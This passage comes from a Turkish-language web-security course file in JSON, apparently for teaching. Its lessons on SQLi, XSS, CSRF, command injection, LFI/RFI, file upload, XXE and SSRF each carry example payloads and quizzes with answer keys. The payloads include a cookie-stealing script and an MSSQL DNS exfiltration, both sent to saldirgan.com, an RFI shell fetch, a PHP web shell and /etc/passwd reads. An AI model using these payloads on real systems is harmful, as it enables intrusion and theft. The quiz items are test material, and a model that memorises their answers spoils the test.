            "Yeni kullanıcı oluşturmak",
            "Sorgunun her zaman doğru (True) dönmesini sağlayarak şifresiz giriş yapmak",
            "Veritabanını silmek",
            "Sayfayı çökertmek"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-03",
      "title": "In-Band SQLi (Error & Union Based)",
      "content": "<h2>In-Band SQL Injection</h2><p>In-Band SQLi, saldırganın enjeksiyonu yaptığı kanal ile veritabanı yanıtlarını aldığı kanalın aynı olduğu en yaygın SQLi türüdür.</p><p>İki alt türe ayrılır:</p><ul><li><strong>Error-Based (Hata Tabanlı) SQLi:</strong> Saldırgan, sorguda bilerek hata tetikler (örn. sözdizimi hatası) ve veritabanının döndürdüğü hata mesajlarından veritabanı şeması ve veriler hakkında bilgi toplar.</li><li><strong>Union-Based (Birlik Tabanlı) SQLi:</strong> Saldırgan, orijinal sorgunun sonuna <code>UNION SELECT</code> ekleyerek kendi belirlediği verileri de sonuç kümesine dahil eder ve sayfaya yansıtır.</li></ul>",
      "example": "<h3>UNION SQLi Adımları:</h3><p>1. Sütun sayısını bulma: <code>' ORDER BY 3--</code><br/>2. Veri sızdırma: <code>' UNION SELECT null, username, password FROM users--</code></p>",
      "questions": [
        {
          "q": "Veritabanının döndürdüğü detaylı hata mesajlarını kullanarak veri sızdırmaya çalışan SQLi türü hangisidir?",
          "options": [
            "Error-Based SQLi",
            "Time-Based Blind SQLi",
            "Out-of-Band SQLi",
            "Boolean-Based Blind SQLi"
          ],
          "correct": 0
        },
        {
          "q": "UNION-Based SQLi saldırısında, UNION sorgusu eklemeden önce hedef tablodaki sütun sayısını bulmak için hangi SQL ifadesi kullanılır?",
          "options": [
            "GROUP BY",
            "ORDER BY",
            "SELECT ALL",
            "WHERE LIMIT"
          ],
          "correct": 1
        },
        {
          "q": "UNION SELECT sorgusunun çalışabilmesi için en temel kural nedir?",
          "options": [
            "Veritabanının MySQL olması",
            "Orijinal sorgu ile UNION sorgusunun döndürdüğü sütun sayısının ve veri tiplerinin eşleşmesi",
            "Kullanıcının admin yetkisine sahip olması",
            "Sistemin çevrimdışı olması"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-04",
      "title": "Blind SQLi (Boolean & Time-Based)",
      "content": "<h2>Blind (Kör) SQL Injection</h2><p>Uygulama, veritabanı hata mesajlarını gizliyorsa veya sorgu sonuçlarını doğrudan sayfaya yansıtmıyorsa In-Band SQLi çalışmaz. Bu durumda <strong>Blind SQLi</strong> teknikleri kullanılır.</p><p>Çeşitleri:</p><ul><li><strong>Boolean-Based:</strong> Saldırgan veritabanına doğru (True) ve yanlış (False) sorular sorar. Sayfanın değişip değişmediğine bakarak (örn. ürünün görünüp görünmemesi) harf harf verileri çözer.</li><li><strong>Time-Based (Zaman Tabanlı):</strong> Sorulan soruya göre veritabanının yanıt süresini geciktirir (örn. `sleep(5)`). Eğer sayfa 5 saniye geç yüklenirse koşulun doğru olduğu anlaşılır.</li></ul>",
      "example": "<h3>Zaman Geciktirme Sorgusu:</h3><p><code>' OR IF(1=1, sleep(5), 0)--</code> sorgusunda, 1=1 doğru olduğu için web sunucusu yanıtı 5 saniye geciktirir.</p>",
      "questions": [
        {
          "q": "Sayfa içeriğinde hiçbir veri veya hata görünmediğinde, veritabanı yanıtının gecikme süresine bakarak veri sızdırmayı sağlayan zafiyet hangisidir?",
          "options": [
            "Union-Based SQLi",
            "Time-Based Blind SQLi",
            "Reflected XSS",
            "Boolean-Based SQLi"
          ],
          "correct": 1
        },
        {
          "q": "Boolean-based Blind SQLi saldırısında veri nasıl elde edilir?",
          "options": [
            "Sayfaya yansıyan hata kodlarıyla",
            "Veritabanının True/False koşullarına verdiği sayfa içeriği değişikliklerini analiz ederek",
            "E-posta göndererek",
            "Dosya indirerek"
          ],
          "correct": 1
        },
        {
          "q": "Zaman tabanlı SQL enjeksiyonunda veritabanını geciktirmek için hangi fonksiyon kullanılır?",
          "options": [
            "DELAY()",
            "SLEEP() / WAITFOR DELAY",
            "PAUSE()",
            "STOP()"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-05",
      "title": "Out-of-Band (OAST) SQLi",
      "content": "<h2>Out-of-Band (OAST) SQL Injection</h2><p>Out-of-Band SQLi, saldırganın enjeksiyonu yaptığı kanal üzerinden veritabanı yanıtını alamadığı (yani ne hata mesajı, ne sayfa değişikliği, ne de zaman gecikmesi kullanamadığı) durumlarda, verileri harici bir ağ protokolü (DNS, HTTP) üzerinden dışarı sızdırma yöntemidir.</p><p>Saldırgan veritabanına, kendi kontrolündeki bir sunucuya (örn. <code>saldirgan.com</code>) DNS sorgusu atmasını tetikleyecek bir sorgu gönderir. Sızdırılacak veri, bu DNS sorgusunun subdomain kısmına eklenir.</p>",
      "example": "<h3>Örnek Tetikleme (MSSQL):</h3><pre><code>DECLARE @host varchar(1024); SELECT @host = (SELECT password FROM users WHERE id=1) + '.saldirgan.com'; EXEC master..xp_dirtree @host;</code></pre><p>Bu tetikleme sonucu veritabanı sunucusu <code>admin123.saldirgan.com</code> adresine DNS sorgusu atar. Saldırgan DNS loglarından şifreyi okur.</p>",
      "questions": [
        {
          "q": "Out-of-Band SQLi saldırılarında veritabanı sunucusu veriyi dışarı sızdırmak için genellikle hangi protokolü kullanmaya zorlanır?",
          "options": [
            "SMTP (E-posta)",
            "DNS / HTTP (Dış istekler)",
            "FTP",
            "SSH"
          ],
          "correct": 1
        },
        {
          "q": "Out-of-Band SQLi hangi durumlarda tercih edilir?",
          "options": [
            "Veritabanı şifrelendiğinde",
            "Error-based veya Blind SQLi tekniklerinin ağ kısıtlamaları veya uygulama yapısı nedeniyle çalışmadığı durumlarda",
            "Sadece MySQL kullanıldığında",
            "Ağ kartı bozulduğunda"
          ],
          "correct": 1
        },
        {
          "q": "Saldırganın DNS isteklerini yakalamak için kullandığı dinleyici sunucu tipine ne ad verilir?",
          "options": [
            "Firewall",
            "OAST / Collaborator Server",
            "Proxy Sunucusu",
            "DNS Cache Sunucusu"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-06",
      "title": "Cross-Site Scripting (XSS) Giriş",
      "content": "<h2>Cross-Site Scripting (XSS) Temelleri</h2><p>XSS, bir web uygulamasının kullanıcıdan aldığı girdileri yeterince filtrelemeden veya kodlamadan sayfaya yansıtması sonucu, saldırganın kurban tarayıcısında zararlı JavaScript kodları çalıştırmasına yol açan bir zafiyettir.</p><p>XSS Üç Ana Kategoriye Ayrılır:</p><ul><li><strong>Reflected (Yansıtılan) XSS:</strong> Zararlı kod URL parametresiyle gönderilir, sunucu bunu alır ve hemen sayfaya yansıtır.</li><li><strong>Stored (Kalıcı) XSS:</strong> Zararlı kod veritabanına kaydedilir (örn. yorumlar). Sayfayı ziyaret eden herkes etkilenir.</li><li><strong>DOM-Based XSS:</strong> Zafiyet tamamen istemci tarafında, JavaScript kodlarının güvensiz kullanımı nedeniyle ortaya çıkar.</li></ul>",
      "example": "<h3>Temel Test Payload'ı:</h3><p>Arama kutusuna veya URL parametresine <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> yazılarak XSS zafiyeti test edilir. Tarayıcıda alert penceresi çıkarsa zafiyet doğrulanmış olur.</p>",
      "questions": [
        {
          "q": "XSS (Cross-Site Scripting) saldırılarında kurbanın bilgisayarında çalıştırılan kod türü hangisidir?",
          "options": [
            "SQL sorguları",
            "JavaScript kodları",
            "Python betikleri",
            "PHP komutları"
          ],
          "correct": 1
        },
        {
          "q": "Zararlı kodun veritabanına kalıcı olarak kaydedildiği ve sayfayı ziyaret eden her kullanıcının etkilendiği XSS türü hangisidir?",
          "options": [
            "Reflected XSS",
            "Stored (Kalıcı) XSS",
            "DOM-Based XSS",
            "Blind XSS"
          ],
          "correct": 1
        },
        {
          "q": "XSS zafiyetlerini engellemek için yapılması gereken en temel işlem hangisidir?",
          "options": [
            "Verileri şifrelemek",
            "Çıktı Kodlama (Output Encoding) ve Girdi Temizleme (Sanitization) yapmak",
            "Kullanıcıları engellemek",
            "HTTPS kullanmak"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-07",
      "title": "Reflected XSS Saldırıları",
      "content": "<h2>Reflected XSS</h2><p>Reflected XSS, en yaygın XSS türüdür. Saldırgan zararlı betiği içeren özel bir bağlantı (URL) hazırlar ve bunu kurbana sosyal mühendislik (e-posta, sohbet mesajı vb.) yoluyla gönderir.</p><p>Kurban bu bağlantıya tıkladığında, istek web sunucusuna gider. Sunucu, URL'deki zararlı betiği alıp oluşturduğu HTML sayfasının içine gömer ve kurbana geri döner. Kurbanın tarayıcısı bu betiği çalıştırır.</p>",
      "example": "<h3>Örnek Saldırı URL'si:</h3><p><code>https://hedef.com/search.php?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br/>Bu linke tıklayan kullanıcının tarayıcısında, o siteye ait oturum çerezleri (cookie) ekrana yazdırılır.</p>",
      "questions": [
        {
          "q": "Reflected XSS saldırısının gerçekleşebilmesi için kurbanın ne yapması gerekir?",
          "options": [
            "Kendi şifresini değiştirmesi",
            "Saldırganın hazırladığı özel bağlantıya (linke) tıklaması",
            "Bilgisayarını kapatması",
            "Siteden çıkış yapması"
          ],
          "correct": 1
        },
        {
          "q": "Reflected XSS zafiyeti genellikle uygulamanın hangi bölümlerinde sıklıkla görülür?",
          "options": [
            "Veritabanı tablolarında",
            "Arama kutuları, hata mesajları veya URL'ye yansıyan girdi alanlarında",
            "Şifreli sayfalarda",
            "Admin paneli ayarlarında"
          ],
          "correct": 1
        },
        {
          "q": "Reflected XSS saldırısı sonucu bir saldırgan en fazla neyi hedefleyebilir?",
          "options": [
            "Web sunucusunun elektriğini kesmeyi",
            "Kurbanın oturum çerezlerini (Session Cookie) çalarak hesabını ele geçirmeyi",
            "Veritabanındaki tüm verileri silmeyi",
            "Kullanıcının IP adresini değiştirmeyi"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-08",
      "title": "Stored XSS ve Oturum Çalma",
      "content": "<h2>Stored XSS (Kalıcı XSS) ve Oturum Çalma</h2><p>Stored XSS, en tehlikeli XSS varyasyonudur. Saldırgan, zararlı JavaScript kodunu web uygulamasındaki bir girdi alanına (örneğin yorum formu, profil ismi, forum gönderisi) yazar ve bu veri sunucu tarafından veritabanına kaydedilir.</p><p>Daha sonra bu sayfayı ziyaret eden her yasal kullanıcının tarayıcısı, veritabanından gelen bu zararlı kodu sayfayla birlikte yükler ve otomatik olarak çalıştırır. Kurbanların hiçbir linke tıklamasına gerek kalmaz.</p>",
      "example": "<h3>Cookie Hırsızlığı Payload'ı:</h3><pre><code>&lt;script&gt;fetch('http://saldirgan.com/log?cookie=' + document.cookie)&lt;/script&gt;</code></pre><p>Bu yorum veritabanına kaydedildiğinde, sayfaya giren herkesin oturum çerezleri saldırganın sunucusuna gönderilir.</p>",
      "questions": [
        {
          "q": "Zararlı kodun veritabanına yazıldığı ve kurbanların sadece normal sayfayı ziyaret etmesiyle çalışan XSS türü hangisidir?",
          "options": [
            "DOM-Based XSS",
            "Reflected XSS",
            "Stored XSS",
            "Blind XSS"
          ],
          "correct": 2
        },
        {
          "q": "Stored XSS kullanarak oturum çerezlerinin (cookie) çalınmasını engellemek için çerez tanımlanırken hangi bayrak (flag) aktif edilmelidir?",
          "options": [
            "Secure",
            "HttpOnly",
            "SameSite",
            "Path"
          ],
          "correct": 1
        },
        {
          "q": "HttpOnly bayrağı aktif edilmiş bir çereze JavaScript kodu (document.cookie) ile erişilebilir mi?",
          "options": [
            "Evet, her zaman erişilir",
            "Hayır, tarayıcı JavaScript'in bu çerezi okumasını engeller",
            "Sadece HTTPS bağlantılarda erişilir",
            "Sadece adminler erişebilir"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-09",
      "title": "DOM-Based XSS",
      "content": "<h2>DOM-Based XSS</h2><p>DOM-Based XSS, zafiyetin sunucu tarafıyla hiçbir alakası olmadığı, tamamen istemci tarafındaki (client-side) JavaScript kodlarının verileri güvensiz bir şekilde işlemesinden kaynaklanan XSS türüdür.</p><p>Zafiyet, tarayıcıdaki güvensiz bir veri kaynağından (Source - örn: `location.search`, `document.referrer`) alınan verilerin, sayfada dinamik olarak HTML oluşturan güvensiz bir çıktı noktasına (Sink - örn: `innerHTML`, `document.write`, `eval`) aktarılmasıyla tetiklenir.</p>",
      "example": "<h3>Zafiyetli JS Kodu:</h3><pre><code>const query = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('welcome').innerHTML = \"Merhaba \" + query;</code></pre><p>Saldırgan URL'e <code>?name=&lt;img src=x onerror=alert(1)&gt;</code> girdiğinde DOM-XSS tetiklenir.</p>",
      "questions": [
        {
          "q": "DOM-Based XSS zafiyetinin diğer XSS türlerinden en büyük farkı nedir?",
          "options": [
            "Veritabanında saklanması",
            "Zafiyetin tamamen istemci tarafındaki JavaScript kodlarında (DOM kaynak ve çıktı noktalarında) gerçekleşmesi",
            "Sadece resim dosyalarında çalışması",
            "Sunucu loglarında kolayca bulunması"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdakilerden hangisi DOM-XSS zafiyetine yol açabilecek tehlikeli bir çıktı noktasıdır (Sink)?",
          "options": [
            "textContent",
            "innerHTML",
            "innerText",
            "console.log"
          ],
          "correct": 1
        },
        {
          "q": "DOM-XSS zafiyetini önlemek için innerHTML yerine hangi güvenli JavaScript özelliği tercih edilmelidir?",
          "options": [
            "eval()",
            "document.write()",
            "textContent / innerText",
            "outerHTML"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "uyg-10",
      "title": "CSRF Saldırısı ve Korunma",
      "content": "<h2>CSRF (Cross-Site Request Forgery)</h2><p>CSRF (Siteler Arası İstek Sahteciliği), kurban kullanıcının tarayıcısında açık olan aktif oturumunu (session) kullanarak, kullanıcının bilgisi ve izni dışında arka planda yetkisiz işlemler (şifre değiştirme, para transferi vb.) gerçekleştirme saldırısıdır.</p><p>Tarayıcılar, bir siteye istek yaparken o siteye ait kayıtlı çerezleri (cookie) otomatik olarak isteğe ekler. Saldırgan bu mekanizmayı suistimal eder.</p>",
      "example": "<h3>Saldırı Senaryosu:</h3><p>Saldırgan kendi sitesine gizli bir form ekler:<br/><code>&lt;form action=\"https://banka.com/transfer\" method=\"POST\"&gt;&lt;input name=\"to\" value=\"saldirgan\" /&gt;&lt;/form&gt;</code>. Kurban bu sayfaya girdiğinde form JavaScript ile otomatik tetiklenir. Kurbanın banka oturumu açıksa işlem gerçekleşir.</p>",
      "questions": [
        {
          "q": "CSRF (Cross-Site Request Forgery) saldırısının temel çalışma prensibi nedir?",
          "options": [
            "Kullanıcının şifresini kaba kuvvetle tahmin etmek",
            "Tarayıcının, hedef siteye yapılan isteklere kayıtlı oturum çerezlerini otomatik ekleme davranışını suistimal etmek",
            "Veritabanını çökertmek",
            "Kullanıcının internetini kesmek"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdakilerden hangisi CSRF saldırılarına karşı en etkili ve standart savunma yöntemidir?",
          "options": [
            "HttpOnly çerez kullanmak",
            "Her form/istek için benzersiz ve tahmin edilemez bir anti-CSRF Token'ı kullanmak",
            "Kullanıcı adlarını şifrelemek",
            "Sadece GET istekleri kullanmak"
          ],
          "correct": 1
        },
        {
          "q": "Çerezlerde kullanılan hangi özellik (attribute), üçüncü taraf sitelerden gelen isteklere çerezlerin eklenmesini engelleyerek CSRF'i zorlaştırır?",
          "options": [
            "Secure",
            "Path",
            "SameSite (Strict/Lax)",
            "Domain"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "uyg-11",
      "title": "Command Injection (Komut Enjeksiyonu) ve RCE",
      "content": "<h2>Command Injection (Sistem Komutu Enjeksiyonu)</h2><p>Command Injection, uygulamanın kullanıcıdan aldığı girdileri doğrudan işletim sistemi komut satırına (shell) gönderip çalıştırması sonucu ortaya çıkan çok kritik bir güvenlik açığıdır.</p><p>Bu zafiyet sayesinde saldırgan sunucu üzerinde işletim sistemi komutları (örn. `cat /etc/passwd`, `whoami`) çalıştırabilir ve en yüksek etki olan <strong>RCE (Remote Code Execution - Uzaktan Kod Çalıştırma)</strong> elde ederek sunucuyu tamamen ele geçirebilir.</p>",
      "example": "<h3>Zafiyetli Kod (PHP):</h3><pre><code>$ip = $_POST['ip'];\nsystem(\"ping -c 4 \" . $ip);</code></pre><p>Saldırgan girdi olarak <code>8.8.8.8 ; cat /etc/passwd</code> gönderirse, sunucu sırasıyla ping atar ve ardından sistemdeki kullanıcı şifre dosyasını okur.</p>",
      "questions": [
        {
          "q": "Command Injection (Komut Enjeksiyonu) zafiyetinin sonucunda saldırganın elde edebileceği en tehlikeli etki hangisidir?",
          "options": [
            "Sayfa tasarımını bozmak",
            "RCE (Uzaktan Kod Çalıştırma - Sunucu kontrolünü ele geçirme)",
            "Kullanıcının oturumunu kapatmak",
            "DNS kayıtlarını değiştirmek"
          ],
          "correct": 1
        },
        {
          "q": "İşletim sisteminde komutları ardışık veya zincirleme çalıştırmak için kullanılan, Command Injection testlerinde sıkça kullanılan karakter hangisidir?",
          "options": [
            "@",
            "#",
            "; veya &",
            "!"
          ],
          "correct": 2
        },
        {
          "q": "Command enjeksiyon zafiyetlerini önlemek için yazılım geliştiricilere ne önerilmelidir?",
          "options": [
            "Kullanıcı girdilerini sistem komut satırına (system, exec vb.) doğrudan göndermekten kaçınmak, güvenli API'lar kullanmak",
            "Tüm kodları şifrelemek",
            "Sadece Linux kullanmak",
            "SSH portunu değiştirmek"
          ],
          "correct": 0
        }
      ]
    },
    {
      "id": "uyg-12",
      "title": "Local File Inclusion (LFI)",
      "content": "<h2>Local File Inclusion (LFI) ve Path Traversal</h2><p>LFI, web uygulamasının sunucu üzerindeki yerel dosyaları dinamik olarak sayfaya dahil etmesi (include) sırasında, kullanıcı girdilerini yeterince doğrulamaması sonucu oluşan zafiyettir.</p><p>Saldırgan <strong>Path Traversal (Dizin Geçişi)</strong> karakterlerini (<code>../</code>) kullanarak üst dizinlere tırmanabilir ve sunucuda okuma yetkisi olan kritik dosyaları (örn: `/etc/passwd`, log dosyaları, konfigürasyonlar) okuyabilir.</p>",
      "example": "<h3>Zafiyetli İstek ve Payload:</h3><p>Uygulama: <code>https://site.com/index.php?page=about.php</code><br/>Saldırı: <code>https://site.com/index.php?page=../../../../etc/passwd</code><br/>Sunucu dosyayı include eder ve içeriğini sayfaya basar.</p>",
      "questions": [
        {
          "q": "LFI (Local File Inclusion) zafiyetinde saldırganın temel amacı nedir?",
          "options": [
            "Veritabanına yeni tablolar eklemek",
            "Sunucu üzerindeki yerel dosyaları okumak veya çalıştırmak",
            "Kullanıcının şifresini değiştirmek",
            "Sunucuyu kapatmak"
          ],
          "correct": 1
        },
        {
          "q": "Üst dizinlere çıkmak ve dizin sınırlarını aşmak için kullanılan Path Traversal karakter dizisi hangisidir?",
          "options": [
            "\\\\",
            "&&",
            "../",
            "???"
          ],
          "correct": 2
        },
        {
          "q": "LFI zafiyetlerini önlemek için en güvenli tasarım yaklaşımı nedir?",
          "options": [
            "Sadece resim dosyalarına izin vermek",
            "Kullanıcıdan dosya adı almak yerine, önceden tanımlanmış güvenli bir dosya listesi (whitelist) üzerinden seçim yaptırmak",
            "Dosya isimlerini MD5 ile hashlemek",
            "Tüm dosyaları silmek"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-13",
      "title": "Remote File Inclusion (RFI)",
      "content": "<h2>Remote File Inclusion (RFI)</h2><p>RFI, LFI zafiyetinin daha ileri bir boyutudur. Uygulamanın, dışarıdan gelen (uzak bir sunucuda barındırılan) bir dosya veya script bağlantısını kendi kod yapısına dahil edip sunucu üzerinde çalıştırmasıdır.</p><p>Saldırgan, kendi kontrolündeki bir web sunucusunda barındırdığı zararlı bir web shell kodunu (örn. `http://saldirgan.com/shell.txt`) hedef uygulamaya parametre olarak gönderir. Sunucu bu uzak dosyayı kendi içine çeker ve çalıştırır. Sonuç doğrudan RCE'dir.</p>",
      "example": "<h3>RFI İstek Analizi:</h3><p>İstek: <code>https://hedef.com/index.php?page=http://saldirgan.com/shell.txt</code><br/>Eğer PHP yapılandırmasında <code>allow_url_include</code> ayarı aktifse, sunucu uzak dosyayı indirir ve kod olarak yürütür.</p>",
      "questions": [
        {
          "q": "RFI (Remote File Inclusion) zafiyetini LFI'dan ayıran en temel fark nedir?",
          "options": [
            "Daha yavaş olması",
            "Sadece Windows sunucularda çalışması",
            "Uzak bir sunucudaki dosyanın hedef uygulamaya dahil edilip çalıştırılabilmesi",
            "Veritabanına erişememesi"
          ],
          "correct": 2
        },
        {
          "q": "PHP tabanlı sunucularda RFI zafiyetinin gerçekleşebilmesi için php.ini dosyasındaki hangi ayarın 'On' (Açık) olması gerekir?",
          "options": [
            "allow_url_fopen",
            "allow_url_include",
            "safe_mode",
            "register_globals"
          ],
          "correct": 1
        },
        {
          "q": "RFI zafiyeti sömürüldüğünde saldırgan genellikle sunucuda ne elde etmiş olur?",
          "options": [
            "Sadece sayfa tasarımı bilgisi",
            "RCE (Uzaktan Kod Çalıştırma / Web Shell erişimi)",
            "DNS çözümleme yetkisi",
            "Kullanıcının IP adresi"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-14",
      "title": "File Upload (Dosya Yükleme) Açıklıkları",
      "content": "<h2>File Upload (Dosya Yükleme) Zafiyetleri</h2><p>Web uygulamalarında profil resmi, CV, belge yükleme gibi alanlar sıklıkla kullanılır. Eğer bu alanlara yüklenen dosyaların uzantısı, tipi ve içeriği kontrol edilmiyorsa <strong>Kısıtlanmamış Dosya Yükleme</strong> zafiyeti ortaya çıkar.</p><p>Saldırgan sunucuya bir <strong>Web Shell</strong> (sunucu komutlarını çalıştırmayı sağlayan PHP/ASP scripti) yükler ve yüklediği dosyanın yoluna tarayıcıdan erişerek sunucuda tam RCE elde eder.</p>",
      "example": "<h3>Basit PHP Web Shell:</h3><pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre><p>Bu dosyayı <code>shell.php</code> adıyla yükleyen saldırgan tarayıcıdan <code>/uploads/shell.php?cmd=whoami</code> adresine giderek komut çalıştırır.</p>",
      "questions": [
        {
          "q": "Güvenlik kontrolü yapılmayan bir dosya yükleme alanına saldırganın öncelikli olarak yüklemek isteyeceği dosya türü hangisidir?",
          "options": [
            "Büyük boyutlu bir PDF belgesi",
            "Web Shell (zararlı script - PHP/ASP/JSP)",
            "Kullanıcı rehberi",
            "Sahte bir JPEG resmi"
          ],
          "correct": 1
        },
        {
          "q": "Yüklenen bir web shell dosyasının sunucuda çalışabilmesi için gerekli olan temel koşul nedir?",
          "options": [
            "Dosyanın adının şifreli olması",
            "Yüklenen dizinin yürütülebilir (executable) olması ve saldırganın bu dosyaya tarayıcıdan erişebilmesi",
            "Sunucunun kapalı olması",
            "Dosyanın PDF uzantılı olması"
          ],
          "correct": 1
        },
        {
          "q": "Dosya yükleme açıklarından korunmak için sunucu tarafında hangi önlem alınmalıdır?",
          "options": [
            "Sadece dosya boyutunu kontrol etmek",
            "Uzantıları sıkı şekilde doğrulamak (whitelist), yüklenen dosyaları yürütülemez (non-executable) bir dizinde tutmak ve dosya adlarını yeniden oluşturmak",
            "Dosyaları e-posta ile göndermek",
            "Tüm kullanıcıları engellemek"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-15",
      "title": "File Upload Bypass Teknikleri",
      "content": "<h2>File Upload Filtrelerini Atlama (Bypass)</h2><p>Geliştiriciler dosya yükleme alanlarını korumak için bazı basit kısıtlamalar ekler. Ancak saldırganlar bu filtreleri atlatmak için çeşitli yöntemler kullanır:</p><ul><li><strong>MIME-Type Bypass:</strong> İstekteki <code>Content-Type</code> başlığı <code>application/x-php</code> yerine proxy (Burp Suite) ile <code>image/jpeg</code> olarak değiştirilir.</li><li><strong>Çift Uzantı / Null Byte:</strong> Dosya <code>shell.php.jpg</code> veya <code>shell.php%00.jpg</code> olarak isimlendirilir.</li><li><strong>Alternatif Uzantılar:</strong> `.php` engellendiyse `.php5`, `.phtml`, `.phar` uzantıları denenir.</li></ul>",
      "example": "<h3>Burp Suite ile Bypass:</h3><p>Saldırgan Burp Suite ile isteği yakalar, dosya içeriği PHP kodu olmasına rağmen HTTP başlığındaki <code>Content-Type: application/octet-stream</code> alanını <code>Content-Type: image/png</code> yaparak filtresi zayıf sunucuları kandırır.</p>",
      "questions": [
        {
          "q": "İstek başlığındaki 'Content-Type' değerini değiştirerek dosya yükleme filtresini atlatma yöntemi hangisidir?",
          "options": [
            "Double Extension Bypass",
            "MIME-Type Bypass",
            "Null Byte Injection",
            "Path Traversal"
          ],
          "correct": 1
        },
        {
          "q": "Sunucunun '.php' uzantısını engellediği durumlarda denenebilecek alternatif PHP uzantısı hangisi olamaz?",
          "options": [
            ".phtml",
            ".phar",
            ".png",
            ".php7"
          ],
          "correct": 2
        },
        {
          "q": "Saldırganın 'shell.php.jpg' isminde bir dosya yüklemesindeki temel amaç nedir?",
          "options": [
            "Dosyayı küçültmek",
            "Uzantı kontrolü yapan basit bir istemci/sunucu filtresini atlatıp dosyanın PHP olarak çalışmasını ummak",
            "Resim galerisi oluşturmak",
            "Şifreleme yapmak"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-16",
      "title": "XML External Entity (XXE)",
      "content": "<h2>XML External Entity (XXE) Zafiyeti</h2><p>XXE, XML girdilerini işleyen web uygulamalarında, XML ayrıştırıcısının (parser) dış referansları (external entities) çözümleme özelliğinin açık olmasından kaynaklanan bir zafiyettir.</p><p>Saldırgan, XML verisinin içine sistem dosyalarını okumayı (örn: `file:///etc/passwd`) veya iç ağdaki diğer sunuculara istek atmayı sağlayan zararlı XML varlıkları (entities) enjekte eder.</p>",
      "example": "<h3>Zararlı XML Payload'ı:</h3><pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p>XML işlendiğinde, sistem şifre dosyasının içeriği ekrana yansıtılır.</p>",
      "questions": [
        {
          "q": "XXE zafiyetinin temel kaynağı nedir?",
          "options": [
            "Veritabanının yavaş çalışması",
            "XML ayrıştırıcısının dış varlıkları (External Entities) çözümleme özelliğinin açık olması",
            "Şifrelerin XML formatında tutulması",
            "HTTPS kullanılmaması"
          ],
          "correct": 1
        },
        {
          "q": "Bir XXE payload'ı içinde yer alan 'SYSTEM \"file:///...\"' ifadesinin amacı nedir?",
          "options": [
            "XML sürümünü güncellemek",
            "Hedef sunucu üzerindeki yerel bir dosyayı okumak",
            "Kullanıcıyı kaydetmek",
            "Veriyi şifrelemek"
          ],
          "correct": 1
        },
        {
          "q": "XXE zafiyetini önlemek için XML kütüphanelerinde hangi özellik kapatılmalıdır?",
          "options": [
            "UTF-8 desteği",
            "External Entities (Dış Varlıklar) çözümleme ve DTD desteği (Disable DTD)",
            "Dosya okuma izni",
            "Sadece POST metodu"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-17",
      "title": "Server-Side Request Forgery (SSRF)",
      "content": "<h2>Server-Side Request Forgery (SSRF)</h2><p>SSRF, saldırganın web uygulamasını manipüle ederek, hedef sunucu adına dışarıdaki veya iç ağdaki diğer sunuculara yönelik istekler atmasını sağladığı bir zafiyettir.</p><p>Saldırgan bu sayede sunucuyu bir proxy gibi kullanarak dışarıya kapalı iç ağ servislerini (örn: veritabanları, admin panelleri, AWS metadata servisleri) tarayabilir ve veri sızdırabilir.</p>",
      "example": "<h3>Örnek Senaryo:</h3><p>Uygulama dışarıdaki bir resmi çekmek için link alıyor: <code>https://site.com/view?url=http://example.com/logo.png</code><br/>Saldırgan parametreyi iç ağa yönlendirir: <code>https://site.com/view?url=http://127.0.0.1:8080/admin</code>. Sunucu kendi localhost'undaki korumalı admin paneline erişir ve içeriği saldırgana gösterir.</p>",
      "questions": [
        {
          "q": "SSRF (Server-Side Request Forgery) zafiyetinin temel tanımı nedir?",
          "options": [
            "Kullanıcı şifresini çalmak",
            "Hedef sunucuya dışarıdan veya iç ağdan yetkisiz istekler yaptırmak",
            "Veritabanına doğrudan SQL enjekte etmek",
            "Tarayıcıyı kilitlemek"
          ],
          "correct": 1
        },
        {
          "q": "Bulut ortamlarında (örn. AWS) SSRF zafiyeti sömürülerek geçici erişim anahtarlarını çalmak için sıklıkla hedef alınan standart metadata IP adresi hangisidir?",
          "options": [
            "127.0.0.1",
            "192.168.1.1",
            "169.254.169.254",
            "8.8.8.8"
          ],
          "correct": 2
        },
        {
          "q": "SSRF zafiyetini önlemek için girdiler kontrol edilirken ne yapılmalıdır?",
          "options": [
            "Sadece URL uzunluğuna bakılmalıdır",
            "İstek atılabilecek güvenli alan adlarını içeren sıkı bir izin listesi (whitelist) uygulanmalıdır",
            "Hiçbir dış isteğe izin verilmemelidir",
            "Sadece HTTPS kullanılmalıdır"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-18",
      "title": "Broken Authentication",
